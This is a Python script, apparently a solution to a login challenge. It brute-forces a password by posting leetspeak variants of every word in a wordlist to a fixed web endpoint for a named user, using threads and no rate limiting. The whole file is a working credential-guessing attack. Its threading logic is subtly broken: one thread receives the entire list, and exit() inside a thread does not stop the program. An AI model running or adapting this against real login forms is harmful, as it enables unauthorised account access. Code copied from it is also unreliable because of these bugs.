import requests
import threading

URL = "https://xl666.pythonanywhere.com/reto"
file = "listado-general.txt"
NUM_HILOS = 20

def buscar_palabra(file:str=file):
    with open(file, 'r') as archivo:
        palabras = [linea.strip() for linea in archivo]

    total_palabras = len(palabras)
    chunk_size = total_palabras

    hilos = []
    for i in range(NUM_HILOS):
        start_index = i * chunk_size
        if i == NUM_HILOS - 1:
            end_index = total_palabras
        else:
            end_index = (i + 1) * chunk_size

        hilo = threading.Thread(target=procesar_palabras, args=(palabras[start_index:end_index],))
        hilos.append(hilo)
        hilo.start()

    for hilo in hilos:
        hilo.join()

def procesar_palabras(palabras):
    for palabra in palabras:
        variantes = gen_Variants(palabra)
        for passwd in variantes:
            send_Post(passwd)

def gen_Variants(palabra:str):
    transformaciones = {
        'e': '3',
        'o': '0',
        'i': '1',
    }
    variantes = ['']
    for caracter in palabra:
        if caracter in transformaciones and caracter not in 'áéíóú':
            nuevas_variantes = [v + caracter for v in variantes] + [v + transformaciones[caracter] for v in variantes]
            variantes = nuevas_variantes
        else:
            variantes = [v + caracter for v in variantes]
    return variantes

def send_Post(passwd, url:str=URL):
    try:
        datos = {
            'nombre': 'Victor Emmanuel López Espejo',
            'nick': 'Victor',
            'pass': passwd
        }
        respuesta = requests.post(url, data=datos)
        
        if respuesta.status_code == 200:
            print("La contraseña es: " + passwd)
            with open('contraseña.txt', 'w') as archivo:
                archivo.write(passwd)
            exit(0)
    except Exception as e:
        print(f'Hubo un error inesperado: {e}')
        exit(1)

if __name__ == '__main__':
    buscar_palabra(file)
